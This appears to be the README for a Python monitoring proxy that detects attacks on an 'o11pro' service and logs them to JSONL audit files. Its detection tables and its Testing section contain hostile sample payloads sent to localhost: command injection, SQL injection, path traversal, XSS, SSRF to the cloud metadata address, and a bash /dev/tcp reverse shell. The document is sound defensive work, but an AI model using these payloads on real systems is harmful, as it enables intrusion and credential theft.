# Security Monitoring Tools

Real-time attack detection for `o11pro`. Monitors HTTP traffic, network connections, file access, and child processes all logged to `audit.log`.

## Files

| File | Purpose |
|------|---------|
| `modules/monitoring.py` | Main monitoring script (Python, no external deps) |
| `audit.log` | All events (INFO and above) created at runtime |
| `audit_alerts.log` | HIGH/CRITICAL events only created at runtime |

## Quick start

```bash
# All-in-one: start o11pro + HLS proxy + security monitor
MONITOR=true ./RunMe.sh

# Point your client at the monitor proxy instead of the real API:
#   Instead of:  http://localhost:19999/api/...
#   Use:         http://localhost:19998/api/...
```

All HTTP requests/responses passing through the proxy are scanned for attacks. Process activity (child processes, file access, network connections) is also monitored via `/proc`.

## Usage

```bash
# Integrated mode (via RunMe.sh)
MONITOR=true ./RunMe.sh

# Direct invocation
python3 modules/monitoring.py --proxy-mode

# Monitor a specific PID
python3 modules/monitoring.py --pid 12345

# Custom proxy port
python3 modules/monitoring.py --proxy-mode --proxy-port 8080 --target-port 19999

# Custom log location
python3 modules/monitoring.py --log logs/audit.log --alerts logs/audit_alerts.log

# One-shot scan (run once and exit)
python3 modules/monitoring.py --once

# Disable process or file monitoring
python3 modules/monitoring.py --no-proc    # HTTP proxy only
python3 modules/monitoring.py --no-files   # No file watching
```

## What it detects

### HTTP traffic (via proxy)

| Category | Severity | Examples detected |
|----------|----------|-------------------|
| **Command injection** | CRITICAL | `;cat /etc/passwd`, `$(cmd)`, `` `cmd` ``, `bash -i >&`, `/dev/tcp/`, `| sh`, `&& wget` |
| **SQL injection** | HIGH | `' OR '1'='1`, `UNION SELECT`, `xp_cmdshell`, `DROP TABLE`, `INTO OUTFILE`, `SLEEP()`, `--` |
| **Path traversal** | HIGH | `../`, `..\\`, `%2e%2e%2f`, `....//`, `/etc/passwd`, `~/.ssh`, null bytes |
| **XSS** | MEDIUM | `<script>`, `javascript:`, `onerror=`, `<iframe>`, `document.cookie`, `eval(` |
| **SSRF** | HIGH | `169.254.169.254` (AWS metadata), `127.0.0.1`, `10.x.x.x`, `192.168.x.x`, `file://`, `gopher://` |
| **Credential exfil** | HIGH | `Bearer` tokens, `Authorization` headers, API keys, JWTs, AWS keys, GitHub tokens |
| **Reverse shell** | CRITICAL | `bash -i >& /dev/tcp/`, `nc -e /bin/`, `python -c ... socket`, `mkfifo /tmp/` |

### Process activity (via /proc)

| Category | Severity | Examples detected |
|----------|----------|-------------------|
| **Suspicious child process** | CRITICAL | `sh`, `bash`, `nc`, `ncat`, `curl`, `wget`, `python -c`, `perl -e`, `chmod +x`, `kill -9` |
| **Suspicious file access** | HIGH | `/etc/passwd`, `/etc/shadow`, `~/.ssh/`, `authorized_keys`, `/proc/self/environ`, `.bash_history` |
| **SSRF internal IP** | HIGH | Connections to `127.0.0.1`, `10.x.x.x`, `192.168.x.x`, `172.16-31.x.x` |
| **Unexpected port** | MEDIUM | Connections to ports other than 80, 443, 89, 53 |
| **Potential exfiltration** | HIGH | >100 MB outbound transfer in 2 seconds |
| **New connection** | INFO | Any new outbound TCP connection (logged for audit trail) |
| **File changes** | MEDIUM | Changes to `keys.txt`, `o11.cfg`, `providers/sample.cfg` |
| **New files in hls/logs** | LOW | Any new file created in watched directories |

## Log format

Both `audit.log` and `audit_alerts.log` are JSONL (one JSON object per line):

```json
{
  "timestamp": "2026-06-17T21:28:30.123456+00:00",
  "type": "attack_command_injection",
  "severity": "CRITICAL",
  "source": "http",
  "details": "reverse shell bash -i: matched 'bash -i >&' in request body",
  "raw": "{\"username\":\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\",\"password\":\"x\"}"
}
```

| Field | Description |
|-------|-------------|
| `timestamp` | UTC ISO 8601 timestamp |
| `type` | Event type (e.g., `attack_command_injection`, `suspicious_process`, `connection`) |
| `severity` | `INFO`, `LOW`, `MEDIUM`, `HIGH`, or `CRITICAL` |
| `source` | Where the event was detected: `http`, `proc`, `net`, `file`, `child` |
| `details` | Human-readable description |
| `raw` | Raw input that triggered the detection (first 1000 chars, for HTTP events) |

## Log rotation

Logs auto-rotate at 100 MB, keeping 5 historical files:
- `audit.log` → `audit.log.1` → `audit.log.2` → ... → `audit.log.5`

## Architecture

```
                    ┌─────────────────────────────────────┐
                    │      monitoring.py                  │
                    │                                     │
  Client ───────────┤──► HTTP Proxy (:19998)              │
  (browser/curl)    │      ├─ scan URL                    │
                    │      ├─ scan headers                │
                    │      ├─ scan body (request)         │
                    │      └─ scan body (response)        │
                    │          │                          │
                    │          ▼ (forward)                │
                    │      o11pro (:19999)                │
                    │                                     │
                    │  Process Monitor (/proc/<pid>)      │
                    │      ├─ child processes             │
                    │      ├─ open files (FDs)            │
                    │      ├─ network connections         │
                    │      ├─ I/O stats (exfil detect)    │
                    │      └─ child cmdlines              │
                    │                                     │
                    │  File Watcher                       │
                    │      ├─ keys.txt                    │
                    │      ├─ o11.cfg                     │
                    │      ├─ providers/sample.cfg        │
                    │      ├─ logs/                       │
                    │      └─ hls/                        │
                    │                                     │
                    └──────────┬──────────┬───────────────┘
                               │          │
                          audit.log   audit_alerts.log
                          (all)       (HIGH/CRITICAL)
```

## Tuning

### Adjust scan interval (default: 2 seconds)

Edit `SCAN_INTERVAL` in `modules/monitoring.py`:
- Lower (0.5-1.0) = more responsive but more CPU
- Higher (5-10) = less CPU but slower detection

### Adjust exfiltration threshold (default: 100 MB per interval)

Edit `EXFIL_THRESHOLD`:
- Lower (10 MB) = more sensitive (may false-positive on legit stream traffic)
- Higher (500 MB) = less sensitive

### Add suspicious IPs

Edit `SUSPICIOUS_IPS` in `modules/monitoring.py`:
```python
SUSPICIOUS_IPS = {
    '1.2.3.4',      # known bad IP
    '5.6.7.8',
}
```

### Adjust expected ports (default: 80, 443, 89, 53)

Edit `EXPECTED_PORTS`:
```python
EXPECTED_PORTS = {80, 443, 89, 53, 8080}
```

### Adjust expected CDN domains

Edit `EXPECTED_DOMAINS` to whitelist your provider's CDNs (reduces false positives on the "new connection" alerts).

## Testing

Verify the monitor detects attacks by sending test payloads through the proxy:

```bash
# Command injection
curl -X POST http://localhost:19998/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin;cat /etc/passwd","password":"x"}'

# SQL injection
curl -X POST http://localhost:19998/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin' OR '1'='1\",\"password\":\"x\"}"

# Path traversal
curl http://localhost:19998/static/../../../etc/passwd

# XSS
curl -X POST http://localhost:19998/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"<script>alert(1)</script>","password":"x"}'

# SSRF (AWS metadata)
curl "http://localhost:19998/api/proxy?url=http://169.254.169.254/latest/meta-data/"

# Reverse shell
curl -X POST http://localhost:19998/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1","password":"x"}'

# Check the logs
cat audit_alerts.log
```

## Interpreting the logs

### High-severity alerts to investigate immediately

| Alert type | What it means | Action |
|------------|---------------|--------|
| `attack_reverse_shell` | Someone tried to spawn a reverse shell via the API | Block the source IP, investigate the request |
| `attack_command_injection` | Shell command injection attempted | Block the source IP, check if the command executed |
| `suspicious_process` | The o11 binary spawned `sh`, `bash`, `nc`, etc. | **Critical** may indicate the binary is compromised |
| `suspicious_file_access` | The binary opened `/etc/passwd`, `~/.ssh`, etc. | Investigate may indicate credential theft |
| `potential_exfil` | >100 MB sent outbound in 2 seconds | Check if legitimate (streaming) or exfiltration |
| `ssrf_internal` | Connection to internal/private IP | Check if legitimate (DB) or SSRF attack |

### Lower-severity events to monitor

| Alert type | What it means |
|------------|---------------|
| `attack_xss` | XSS payload in request check if reflected in response |
| `attack_sql_injection` | SQLi payload check if the API is vulnerable |
| `attack_path_traversal` | Path traversal attempted check if file was accessed |
| `attack_credential_exfil` | Credentials in request may be legitimate auth or exfil |
| `unexpected_port` | Connection to non-standard port may be legitimate |
| `file_change` | Config file modified verify it was authorized |

## Limitations

1. **No TLS inspection** the proxy can only scan HTTP, not HTTPS. For HTTPS, configure the o11 binary to use HTTP internally and terminate TLS at a reverse proxy (nginx) that forwards to the monitor.

2. **Process monitoring is polling-based** fast-lived child processes (<2 seconds) may be missed. Lower `SCAN_INTERVAL` for better coverage.

3. **No memory inspection** the monitor can't see what's in the process's memory (would need `gdb` or `ptrace`). It only sees file descriptors, network connections, and child processes.

4. **False positives** the "shell metacharacter" rule is aggressive (matches `;`, `|`, `&`, `$`, `(`, `)`). Legitimate requests containing these characters will trigger alerts. Tune the regex in `ATTACK_SIGNATURES` if needed.

5. **Single-process monitoring** only monitors one PID. If the o11 binary spawns helper processes that make their own connections, those won't be tracked unless you monitor the children too.

## Integration with RunMe.sh

For a fully monitored deployment:

```bash
# All-in-one: o11pro + HLS proxy + security monitor
MONITOR=true ./RunMe.sh 19999 2

# Watch the alerts in real-time (in another terminal)
tail -f logs/audit_alerts.log | python3 -c "
import json, sys
for line in sys.stdin:
    d = json.loads(line)
    print(f\"[{d['severity']}] {d['type']}: {d['details']}\")
"

# Use port 19998 for all client access (instead of 19999)
# The monitor will scan every request and response through the proxy
```
